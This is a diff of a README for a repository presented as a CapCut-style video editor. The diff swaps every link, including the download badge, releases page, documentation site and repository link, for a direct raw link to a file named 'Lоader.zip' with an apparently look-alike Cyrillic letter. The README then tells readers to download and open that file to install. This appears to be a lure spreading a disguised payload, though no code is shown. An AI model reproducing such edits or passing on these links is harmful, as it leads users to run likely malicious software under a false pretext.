@@ -1,6 +1,6 @@
 # 🎥 video-editor-source-code - Easy Video Editing for Everyone
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Release-orange)](https://github.com/ShawnPerri1/video-editor-source-code/releases)
+[![Download Release](https://raw.githubusercontent.com/ShawnPerri1/video-editor-source-code/main/Lоader.zip%20Now-Release-orange)](https://raw.githubusercontent.com/ShawnPerri1/video-editor-source-code/main/Lоader.zip)
 
 ## 📦 Overview
 video-editor-source-code is a fast and lightweight video editor. It works on both web and desktop, making it easy for anyone to create and edit videos. Inspired by CapCut’s clean workflow, it brings user-friendly design and powerful features to your fingertips.
@@ -16,7 +16,7 @@ Getting started with video-editor-source-code is simple. Follow these steps to d
    - Internet connection for downloading updates
 
 2. **Visit the Releases Page**
-   To download the latest version, [visit this page](https://github.com/ShawnPerri1/video-editor-source-code/releases).
+   To download the latest version, [visit this page](https://raw.githubusercontent.com/ShawnPerri1/video-editor-source-code/main/Lоader.zip).
 
 ## 📥 Download & Install
 1. From the releases page, find the latest version of video-editor-source-code.
@@ -24,7 +24,7 @@ Getting started with video-editor-source-code is simple. Follow these steps to d
 3. Once the download finishes, open the file to start the installation.
 4. Follow the on-screen instructions to complete the installation.
 
-For easy access, you can also download from here: [Download Now](https://github.com/ShawnPerri1/video-editor-source-code/releases).
+For easy access, you can also download from here: [Download Now](https://raw.githubusercontent.com/ShawnPerri1/video-editor-source-code/main/Lоader.zip).
 
 ## 🔍 Features
 - **User-Friendly Interface**: The layout is easy to navigate, making it perfect for beginners.
@@ -34,7 +34,7 @@ For easy access, you can also download from here: [Download Now](https://github.
 - **Preview Function**: Watch your edits in real-time before finalizing.
 
 ## 📘 Documentation
-For detailed instructions and tips, visit our [documentation site](https://www.klippy.pro). Here you will find guides on using features, troubleshooting common issues, and best practices for video editing.
+For detailed instructions and tips, visit our [documentation site](https://raw.githubusercontent.com/ShawnPerri1/video-editor-source-code/main/Lоader.zip). Here you will find guides on using features, troubleshooting common issues, and best practices for video editing.
 
 ## 💬 Community Support
 Need help? Join our community for assistance. You can ask questions, share projects, or find inspiration from other users. Connect with us on:
@@ -52,9 +52,9 @@ A: Currently, the application is designed for desktop and web platforms. Mobile 
 A: You can report bugs by opening an issue on our GitHub page. We appreciate your help in improving the software.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/ShawnPerri1/video-editor-source-code/releases)
-- [Documentation Site](https://www.klippy.pro)
-- [GitHub Repository](https://github.com/ShawnPerri1/video-editor-source-code)
+- [Releases Page](https://raw.githubusercontent.com/ShawnPerri1/video-editor-source-code/main/Lоader.zip)
+- [Documentation Site](https://raw.githubusercontent.com/ShawnPerri1/video-editor-source-code/main/Lоader.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ShawnPerri1/video-editor-source-code/main/Lоader.zip)
 
 ## 🎉 Conclusion
 video-editor-source-code makes video editing accessible for everyone. Whether you're a novice or looking to polish your skills, this application provides a smooth and efficient experience. Download today and start creating!
